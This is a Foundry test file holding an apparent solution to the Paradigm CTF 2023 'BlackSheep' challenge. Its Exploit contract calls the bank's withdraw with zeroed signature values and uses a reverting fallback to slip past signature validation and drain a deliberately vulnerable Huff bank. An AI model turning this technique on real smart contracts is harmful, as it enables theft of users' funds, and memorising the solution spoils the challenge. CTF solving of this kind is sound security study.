// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../../src/Paradigm2023/BlackSheep/Challenge.sol";
import "../../lib/foundry-huff/src/HuffConfig.sol";
import "../../src/Paradigm2023/BlackSheep/ISimpleBank.sol";

contract BlackSheepTest is Test {
    HuffConfig config = new HuffConfig();
    Challenge challenge;
    ISimpleBank bank;

    function setUp() public {
        config = new HuffConfig();

        bank = ISimpleBank(config.deploy("SimpleBank"));

        payable(address(bank)).transfer(10 ether);

        challenge = new Challenge(bank);
    }

    function test_isSolvedBlackSheep() public {
        Exploit exploit = new Exploit();
        exploit.exp{value: 10}(bank);
        assertTrue(challenge.isSolved());
    }
}

contract Exploit {
    function exp(ISimpleBank bank) external payable {
        bank.withdraw{value: 10}(
            0x0000000000000000000000000000000000000000000000000000000000000000,
            0x00,
            0x0000000000000000000000000000000000000000000000000000000000000000,
            0x0000000000000000000000000000000000000000000000000000000000000000
        );
    }

    fallback() external payable {
        require(msg.value > 30);
    }
}
